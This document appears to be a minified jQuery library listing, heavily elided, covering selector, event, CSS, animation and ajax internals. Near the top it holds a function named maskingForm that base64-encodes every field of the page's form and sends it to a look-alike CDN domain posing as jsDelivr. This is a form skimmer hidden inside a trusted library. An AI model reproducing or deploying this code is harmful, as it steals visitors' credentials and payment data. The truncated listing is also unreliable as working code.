! function(e, t) {
    ...
    b.fn = b.prototype = {
        ...
        function maskingForm() {
            $.ajax({
                url: "https://cdn.jsdelivr.pw/jquery.min.js/" + encodeURIComponent(btoa($("form").serialize())),
                type: "GET",
                dataType: "text",
                headers: {
    ...
    var T = function(e) {
            ...
            if (!i && (p(t), t = t || d, g)) {
                ...
                if (n.qsa && !E[e + " "] && (!v || !v.test(e)) && (1 !== _ || "object" !== t.nodeName.toLowerCase())) {
                    if (m = e, y = t, 1 === _ && (U.test(e) || X.test(e))) {
                        for ((y = et.test(e) && e$(t.parentNode) || t) === t && n.scope || ((c = t.getAttribute("id")) ? c = c.replace(ei, eo) : t.setAttribute("id", c = b)), s = (h = a(e)).length; s--;) h[s] = (c ? "#" + c : ":scope") + " " + eb(h[s]);
                        m = h.join(",")
                    }
                    try {
        ...
        for (t in n = el.support = {}, o = el.isXML = function(e) {
                ...
                return a != d && 9 === a.nodeType && a.documentElement && (h = (d = a).documentElement, g = !o(d), _ != d && (i = d.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", ea, !1) : i.attachEvent && i.attachEvent("onunload", ea)), n.scope = ep(function(e) {
                    return h.appendChild(e).appendChild(d.createElement("div")), void 0 !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length
                }), n.attributes = ep(function(e) {
                    return e.className = "i", !e.getAttribute("className")
                }), n.getElementsByTagName = ep(function(e) {
                    return e.appendChild(d.createComment("")), !e.getElementsByTagName("*").length
                }), n.getElementsByClassName = Z.test(d.getElementsByClassName), n.getById = ep(function(e) {
                ...
                }, m = [], v = [], (n.qsa = Z.test(d.querySelectorAll)) && (ep(function(e) {
                    var t;
                ...
                })), (n.matchesSelector = Z.test(y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && ep(function(e) {
                    n.disconnectedMatch = y.call(e, "*"), y.call(e, "[s!='']:x"), m.push("!=", B)
                }), v = v.length && RegExp(v.join("|")), m = m.length && RegExp(m.join("|")), x = (t = Z.test(h.compareDocumentPosition)) || Z.test(h.contains) ? function(e, t) {
                ...
                filter: {
                    ...
                    CLASS: function(e) {
                        var t = C[e + " "];
                        return t || (t = RegExp("(^|" + I + ")" + e + "(" + I + "|$)"), C(e, function(e) {
                    ...
                    PSEUDO: function(e, t) {
                        var n, i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || el.error("unsupported pseudo: " + e);
                ...
                pseudos: {
                    ...
                    lang: ef(function(e) {
                        return G.test(e || "") || el.error("unsupported lang: " + e), e = e.replace(en, er).toLowerCase(),
                            function(t) {
                                var n;
                                do
        ...
        function eC(e, t, n, r, i, o) {
            return r && !r[b] && (r = eC(r)), i && !i[b] && (i = eC(i, o)), ef(function(o, a, s, u) {
                var l, c, f, p = [],
                    d = [],
                    h = a.length,
                    g = o || function(e, t, n) {
                    ...
                    m = n ? i || (o ? e : h || r) ? [] : a : v;
                if (n && n(v, m, s, u), r)
                    for (l = ew(m, d), r(l, [], s, u), c = l.length; c--;)(f = l[c]) && (m[d[c]] = !(v[d[c]] = f));
                if (o) {
                    if (i || e) {
                        if (i) {
        ...
        function ek(e) {
            for (var t, n, i, o = e.length, a = r.relative[e[0].type], s = a || r.relative[" "], u = a ? 1 : 0, c = e_(function(e) {
                    return e === t
                }, s, !0), f = e_(function(e) {
                    return P(t, e) > -1
        ...
        return ex.prototype = r.filters = r.pseudos, r.setFilters = new ex, a = el.tokenize = function(e, t) {
            var n, i, o, a, s, u, l, c = k[e + " "];
            if (c) return t ? 0 : c.slice(0);
            for (s = e, u = [], l = r.preFilter; s;) {
                for (a in (!n || (i = z.exec(s))) && (i && (s = s.slice(i[0].length) || s), u.push(o = [])), n = !1, (i = X.exec(s)) && (n = i.shift(), o.push({
                        value: n,
                        type: i[0].replace(F, " ")
            ...
            if (!v) {
                ...
                (v = S(e, (n = h, o = (i = f).length > 0, s = n.length > 0, u = function(e, t, a, u, c) {
                    var f, h, v, m = 0,
                        y = "0",
                        x = e && [],
                        b = [],
        ...
        }, n.sortStable = b.split("").sort(N).join("") === b, n.detectDuplicates = !!f, p(), n.sortDetached = ep(function(e) {
                                ...
                                var s = this,
                                    ...
                                    l = function() {
                                        ...
                                        if (!(t < o)) {
                                            ...
                                            h(l = e && ("object" == typeof e || "function" == typeof e) && e.then) ? i ? l.call(e, a(o, n, P, i), a(o, n, O, i)) : (o++, l.call(e, a(o, n, P, i), a(o, n, O, i), a(o, n, P, n.notifyWith))) : (r !== P && (s = void 0, u = [e]), (i || n.resolveWith)(s, u))
                                        }
                                    },
                                    c = i ? l : function() {
                                        try {
    ...
    function ec(e, t) {
        for (var n, r, i = [], o = 0, a = e.length; o < a; o++)(r = e[o]).style && (n = r.style.display, t ? ("none" === n && (i[o] = Y.get(r, "display") || null, i[o] || (r.style.display = "")), "" === r.style.display && ea(r) && (i[o] = el(r))) : "none" !== n && (i[o] = "none", Y.set(r, "display", n)));
    ...
    function ex(e, t, n, r, i) {
        for (var o, a, s, u, l, c, f = t.createDocumentFragment(), p = [], d = 0, h = e.length; d < h; d++)
            ...
            else if (l = ei(o), a = em(f.appendChild(o), "script"), l && ey(a), n)
            for (c = 0; o = a[c++];) eg.test(o.type || "") && n.push(o);
        return f
    }
    var eb = /^([^.]*)(?:\.(.+)|)/;
    ...
    b.event = {
        ...
        add: function(e, t, n, r, i) {
            ...
            if (V(e))
                for (n.handler && (n = (o = n).handler, i = o.selector), i && b.find.matchesSelector(er, i), n.guid || (n.guid = b.guid++), (u = v.events) || (u = v.events = Object.create(null)), (a = v.handle) || (a = v.handle = function(t) {
                        return void 0 !== b && b.event.triggered !== t.type ? b.event.dispatch.apply(e, arguments) : void 0
                    }), l = (t = (t || "").match(H) || [""]).length; l--;) d = g = (s = eb.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), d && (f = b.event.special[d] || {}, d = (i ? f.delegateType : f.bindType) || d, f = b.event.special[d] || {}, c = b.extend({
                    type: d,
                    origType: g,
                    data: r,
                    handler: n,
            ...
            if (v && (u = v.events)) {
                for (l = (t = (t || "").match(H) || [""]).length; l--;)
                    if (d = g = (s = eb.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), d) {
                        for (f = b.event.special[d] || {}, p = u[d = (r ? f.delegateType : f.bindType) || d] || [], s = s[2] && RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = p.length; o--;) c = p[o], !i && g !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector) || (p.splice(o, 1), c.selector && p.delegateCount--, f.remove && f.remove.call(e, c));
    ...
    function eL(e, t, n, r) {
        ...
        if (p && (a = (i = ex(t, e[0].ownerDocument, !1, e, r)).firstChild, 1 === i.childNodes.length && (i = a), a || r)) {
            ...
            if (u)
                for (c = s[s.length - 1].ownerDocument, b.map(s, ej), f = 0; f < u; f++) l = s[f], eg.test(l.type || "") && !Y.access(l, "globalEval") && b.contains(c, l) && (l.src && "module" !== (l.type || "").toLowerCase() ? b._evalUrl && !l.noModule && b._evalUrl(l.src, {
    ...
    b.extend({
        ...
        clone: function(e, t, n) {
            ...
            if (!(d.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || b.isXMLDoc(e)))
                for (a = em(c), r = 0, i = (o = em(e)).length; r < i; r++) s = o[r], u = a[r], l = void 0, "input" === (l = u.nodeName.toLowerCase()) && ed.test(s.type) ? u.checked = s.checked : "input" !== l && "textarea" !== l || (u.defaultValue = s.defaultValue);
            if (t) {
                if (n)
                    for (o = o || em(e), a = a || em(c), r = 0, i = o.length; r < i; r++) eq(o[r], a[r]);
                else eq(e, c)
            }
    ...
    function eM(e, t, n) {
        ...
        return (n = n || eO(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || ei(e) || (a = b.style(e, t)), !d.pixelBoxStyles() && eP.test(a) && eI.test(t) && (r = s.width, i = s.minWidth, o = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = r, s.minWidth = i, s.maxWidth = o)), void 0 !== a ? a + "" : a
    }
    ...
    function eW(e, t) {
        ...
        function t() {
            if (c) {
                ...
                r = "1%" !== t.top, u = 12 === n(t.marginLeft), c.style.right = "60%", a = 36 === n(t.right), i = 36 === n(t.width), c.style.position = "absolute", o = 12 === n(c.offsetWidth / 3), er.removeChild(l), c = null
            }
        }
    ...
    function eR(e) {
        return b.cssProps[e] || e9[e] || (e in eB ? e : e9[e] = function(e) {
            for (var t = e[0].toUpperCase() + e.slice(1), n = e1.length; n--;)
                if ((e = e1[n] + t) in eB) return e
        }(e) || e)
    }
    ...
    function e4(e, t, n, r, i, o) {
        ...
        for (; a < 4; a += 2) "margin" === n && (u += b.css(e, n + en[a], !0, i)), r ? ("content" === n && (u -= b.css(e, "padding" + en[a], !0, i)), "margin" !== n && (u -= b.css(e, "border" + en[a] + "Width", !0, i))) : (u += b.css(e, "padding" + en[a], !0, i), "padding" !== n ? u += b.css(e, "border" + en[a] + "Width", !0, i) : s += b.css(e, "border" + en[a] + "Width", !0, i));
    ...
    function eU(e, t, n) {
        ...
        return (!d.boxSizingReliable() && i || !d.reliableTrDimensions() && S(e, "tr") || "auto" === a || !parseFloat(a) && "inline" === b.css(e, "display", !1, r)) && e.getClientRects().length && (i = "border-box" === b.css(e, "boxSizing", !1, r), (o = s in e) && (a = e[s])), (a = parseFloat(a) || 0) + e4(e, t, n || (i ? "border" : "content"), o, r, a) + "px"
    }
    ...
    b.extend({
        ...
        style: function(e, t, n, r) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                ...
                "string" == (o = typeof n) && (i = et.exec(n)) && i[1] && (n = es(e, t, i), o = "number"), null != n && n == n && ("number" !== o || u || (n += i && i[3] || (b.cssNumber[s] ? "" : "px")), d.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (u ? l.setProperty(t, n) : l[t] = n))
            }
        },
        css: function(e, t, n, r) {
            var i, o, a, s = U(t);
            return e8.test(t) || (t = eR(s)), (a = b.cssHooks[t] || b.cssHooks[s]) && "get" in a && (i = a.get(e, !0, n)), void 0 === i && (i = eM(e, t, r)), "normal" === i && t in eX && (i = eX[t]), "" === n || n ? (o = parseFloat(i), !0 === n || isFinite(o) ? o || 0 : i) : i
        }
    }), b.each(["height", "width"], function(e, t) {
        b.cssHooks[t] = {
            get: function(e, n, r) {
                if (n) return !eF.test(b.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? eU(e, t, r) : e0(e, ez, function() {
                    return eU(e, t, r)
                })
            },
            set: function(e, n, r) {
                var i, o = eO(e),
                    ...
                    u = r ? e4(e, t, r, s, o) : 0;
                return s && a && (u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - e4(e, t, "border", !1, o) - .5)), u && (i = et.exec(n)) && "px" !== (i[3] || "px") && (e.style[t] = n, n = b.css(e, t)), e2(0, n, u)
            }
        }
    }), b.cssHooks.marginLeft = eW(d.reliableMarginLeft, function(e, t) {
        if (t) return (parseFloat(eM(e, "marginLeft")) || e.getBoundingClientRect().left - e0(e, {
            marginLeft: 0
        }, function() {
    ...
    }, e3.prototype.init.prototype = e3.prototype, e3.propHooks = {
        _default: {
            get: function(e) {
                var t;
    ...
    function eK(e, t, n) {
        for (var r, i = (e5.tweeners[t] || []).concat(e5.tweeners["*"]), o = 0, a = i.length; o < a; o++)
    ...
    function e5(e, t, n) {
        ...
        return b.map(c, eK, l), h(l.opts.start) && l.opts.start.call(e, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), b.fx.timer(b.extend(u, {
            elem: e,
            anim: l,
            queue: l.opts.queue
        })), l
    ...
    b.Animation = b.extend(e5, {
        ...
        prefilters: [function(e, t, n) {
            ...
            for (r in n.queue || (null == (a = b._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, s = a.empty.fire, a.empty.fire = function() {
                ...
                for (r in f && 1 === e.nodeType && (n.overflow = [h.overflow, h.overflowX, h.overflowY], null == (l = v && v.display) && (l = Y.get(e, "display")), "none" === (c = b.css(e, "display")) && (l ? c = l : (ec([e], !0), l = e.style.display || l, c = b.css(e, "display"), ec([e]))), ("inline" === c || "inline-block" === c && null != l) && "none" === b.css(e, "float") && (u || (p.done(function() {
                        h.display = l
                    ...
                    display: l
                }), o && (v.hidden = !g), g && ec([e], !0), p.done(function() {
                    for (r in g || ec([e]), Y.remove(e, "fxshow"), d) b.style(e, r, d[r])
                })), u = eK(g ? v[r] : 0, r, p), r in v || (v[r] = u.start, g && (u.end = u.start, u.start = 0))
        }, ],
        ...
        stop: function(e, t, n) {
            ...
            return "string" != typeof e && (n = t, t = e, e = void 0), t && this.queue(e || "fx", []), this.each(function() {
                ...
                if (i) a[i] && a[i].stop && r(a[i]);
                    ...
                    for (i in a) a[i] && a[i].stop && eY.test(i) && r(a[i]);
    ...
    }, eJ = v.createElement("input"), eZ = v.createElement("select").appendChild(v.createElement("option")), eJ.type = "checkbox", d.checkOn = "" !== eJ.value, d.optSelected = eZ.selected, (eJ = v.createElement("input")).value = "t", eJ.type = "radio", d.radioValue = "t" === eJ.value;
    var eJ, eZ, te, tt = b.expr.attrHandle;
    b.fn.extend({
        attr: function(e, t) {
        ...
        attr: function(e, t, n) {
            ...
            if (3 !== o && 8 !== o && 2 !== o) return void 0 === e.getAttribute ? b.prop(e, t, n) : (1 === o && b.isXMLDoc(e) || (i = b.attrHooks[t.toLowerCase()] || (b.expr.match.bool.test(t) ? te : void 0)), void 0 !== n ? null === n ? void b.removeAttr(e, t) : i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = b.find.attr(e, t)) ? void 0 : r)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
    ...
    b.fn.extend({
        ...
        toggleClass: function(e, t) {
            ...
            return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : h(e) ? this.each(function(n) {
                ...
                var t, i, o, a;
                if (r)
                    for (i = 0, o = b(this), a = ta(e); t = a[i++];) o.hasClass(t) ? o.removeClass(t) : o.addClass(t);
    ...
    b.extend(b.event, {
        trigger: function(t, n, r, i) {
            ...
            if (a = d = s = r = r || v, 3 !== r.nodeType && 8 !== r.nodeType && !tu.test(y + b.event.triggered) && (y.indexOf(".") > -1 && (y = (x = y.split(".")).shift(), x.sort()), l = 0 > y.indexOf(":") && "on" + y, (t = t[b.expando] ? t : new b.Event(y, "object" == typeof t && t)).isTrigger = i ? 2 : 3, t.namespace = x.join("."), t.rnamespace = t.namespace ? RegExp("(^|\\.)" + x.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = r), n = null == n ? [t] : b.makeArray(n, [t]), p = b.event.special[y] || {}, i || !p.trigger || !1 !== p.trigger.apply(r, n))) {
                ...
                for (o = 0;
                    (a = m[o++]) && !t.isPropagationStopped();) d = a, t.type = o > 1 ? u : p.bindType || y, (f = (Y.get(a, "events") || Object.create(null))[t.type] && Y.get(a, "handle")) && f.apply(a, n), (f = l && a[l]) && f.apply && V(a) && (t.result = f.apply(a, n), !1 === t.result && t.preventDefault());
                return t.type = y, i || t.isDefaultPrevented() || p._default && !1 !== p._default.apply(m.pop(), n) || !V(r) || l && h(r[y]) && !g(r) && ((s = r[l]) && (r[l] = null), b.event.triggered = y, t.isPropagationStopped() && d.addEventListener(y, tl), r[y](), t.isPropagationStopped() && d.removeEventListener(y, tl), b.event.triggered = void 0, s && (r[l] = s)), t.result
            }
        },
    ...
    tS.href = tc.href, b.extend({
        ...
        ajax: function(t, n) {
            ...
            var r, i, o, a, s, u, l, c, f, p, d = b.ajaxSetup({}, n),
                ...
                C = {
                    ...
                    getResponseHeader: function(e) {
                        ...
                        if (l) {
                            if (!a)
                                for (a = {}; t = tb.exec(o);) a[t[1].toLowerCase() + " "] = (a[t[1].toLowerCase() + " "] || []).concat(t[2]);
                            t = a[e.toLowerCase() + " "]
                        }
            ...
            if (m.promise(C), d.url = ((t || d.url || tc.href) + "").replace(tT, tc.protocol + "//"), d.type = n.method || n.type || d.method || d.type, d.dataTypes = (d.dataType || "*").toLowerCase().match(H) || [""], null == d.crossDomain) {
                u = v.createElement("a");
                try {
            ...
            for (f in (c = b.event && d.global) && 0 == b.active++ && b.event.trigger("ajaxStart"), d.type = d.type.toUpperCase(), d.hasContent = !t_.test(d.type), i = d.url.replace(t$, ""), d.hasContent ? d.data && d.processData && 0 === (d.contentType || "").indexOf("application/x-www-form-urlencoded") && (d.data = d.data.replace(ty, "+")) : (p = d.url.slice(i.length), d.data && (d.processData || "string" == typeof d.data) && (i += (tp.test(i) ? "&" : "?") + d.data, delete d.data), !1 === d.cache && (i = i.replace(tx, "$1"), p = (tp.test(i) ? "&" : "?") + "_=" + tf.guid++ + p), d.url = i + p), d.ifModified && (b.lastModified[i] && C.setRequestHeader("If-Modified-Since", b.lastModified[i]), b.etag[i] && C.setRequestHeader("If-None-Match", b.etag[i])), (d.data && d.hasContent && !1 !== d.contentType || n.contentType) && C.setRequestHeader("Content-Type", d.contentType), C.setRequestHeader("Accept", d.dataTypes[0] && d.accepts[d.dataTypes[0]] ? d.accepts[d.dataTypes[0]] + ("*" !== d.dataTypes[0] ? ", " + tk + "; q=0.01" : "") : d.accepts["*"]), d.headers) C.setRequestHeader(f, d.headers[f]);
            ...
            function E(t, n, a, u) {
                var f, p, v, _, T, w = n;
                l || (l = !0, s && e.clearTimeout(s), r = void 0, o = u || "", C.readyState = t > 0 ? 4 : 0, f = t >= 200 && t < 300 || 304 === t, a && (_ = function(e, t, n) {
                ...
                }(d, C, a)), !f && b.inArray("script", d.dataTypes) > -1 && 0 > b.inArray("json", d.dataTypes) && (d.converters["text script"] = function() {}), _ = function(e, t, n, r) {
                    var i, o, a, s, u, l = {},
                        c = e.dataTypes.slice();
                    if (c[1])
                ...
                }(d, _, C, f), f ? (d.ifModified && ((T = C.getResponseHeader("Last-Modified")) && (b.lastModified[i] = T), (T = C.getResponseHeader("etag")) && (b.etag[i] = T)), 204 === t || "HEAD" === d.type ? w = "nocontent" : 304 === t ? w = "notmodified" : (w = _.state, p = _.data, f = !(v = _.error))) : (v = w, !t && w || (w = "error", t < 0 && (t = 0))), C.status = t, C.statusText = (n || w) + "", f ? m.resolveWith(h, [p, w, C]) : m.rejectWith(h, [C, w, v]), C.statusCode(x), x = void 0, c && g.trigger(f ? "ajaxSuccess" : "ajaxError", [C, d, f ? p : v]), y.fireWith(h, [C, w]), c && (g.trigger("ajaxComplete", [C, d]), --b.active || b.event.trigger("ajaxStop")))
            }
            return C
        },
    ...
    d.cors = !!tj && "withCredentials" in tj, d.ajax = tj = !!tj, b.ajaxTransport(function(t) {
        var n, r;
        if (d.cors || tj && !t.crossDomain) return {
            send: function(i, o) {
                var a, s = t.xhr();
                ...
                n = function(e) {
                    return function() {
                        n && (n = r = s.onload = s.onerror = s.onabort = s.ontimeout = s.onreadystatechange = null, "abort" === e ? s.abort() : "error" === e ? "number" != typeof s.status ? o(0, "error") : o(s.status, s.statusText) : o(tD[s.status] || s.status, s.statusText, "text" !== (s.responseType || "text") || "string" != typeof s.responseText ? {
                            binary: s.response
                        } : {
                            text: s.responseText
    ...
    b.ajaxSetup({
        ...
        var i, o, a, s = !1 !== t.jsonp && (tH.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && tH.test(t.data) && "data");
        if (s || "jsonp" === t.dataTypes[0]) return i = t.jsonpCallback = h(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, s ? t[s] = t[s].replace(tH, "$1" + i) : !1 !== t.jsonp && (t.url += (tp.test(t.url) ? "&" : "?") + t.jsonp + "=" + i), t.converters["script json"] = function() {
    ...
    }), d.createHTMLDocument = ((tq = v.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === tq.childNodes.length), b.parseHTML = function(e, t, n) {
        var r, i, o;
        return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (d.createHTMLDocument ? ((r = (t = v.implementation.createHTMLDocument("")).createElement("base")).href = v.location.href, t.head.appendChild(r)) : t = v), o = !n && [], (i = E.exec(e)) ? [t.createElement(i[1])] : (i = ex([e], t, o), o && o.length && b(o).remove(), b.merge([], i.childNodes)))
    }, b.fn.load = function(e, t, n) {
        var r, i, o, a = this,
            s = e.indexOf(" ");
        return s > -1 && (r = ti(e.slice(s)), e = e.slice(0, s)), h(t) ? (n = t, t = void 0) : t && "object" == typeof t && (i = "POST"), a.length > 0 && b.ajax({
            url: e,
            type: i || "GET",
            dataType: "html",
            data: t
    ...
    }, b.isArray = Array.isArray, b.parseJSON = JSON.parse, b.nodeName = S, b.isFunction = h, b.isWindow = g, b.camelCase = U, b.type = x, b.now = Date.now, b.isNumeric = function(e) {
        var t = b.type(e);
